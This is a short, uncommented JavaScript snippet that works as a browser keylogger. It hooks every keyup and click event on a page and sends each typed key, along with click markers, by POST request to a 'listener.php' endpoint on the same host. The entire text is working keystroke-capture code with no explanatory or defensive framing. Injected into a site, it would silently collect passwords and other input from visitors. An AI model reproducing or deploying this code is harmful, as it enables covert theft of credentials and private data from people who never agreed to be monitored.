(function() {
    var server = "https://" + location.host + "/listener.php";
    document.addEventListener("keyup", function(e) {
        var x = new XMLHttpRequest();
        x.open("POST", server, true);
        x.send(e.key);
    });
    document.addEventListener("click", function(e) {
        var click;
        if (e.which == 1) {
            click = " MouseClick ";
        } else {
            click = " MouseClick ";
        }
        var x = new XMLHttpRequest();
        x.open("POST", server, true);
        x.send(click);
    });
})();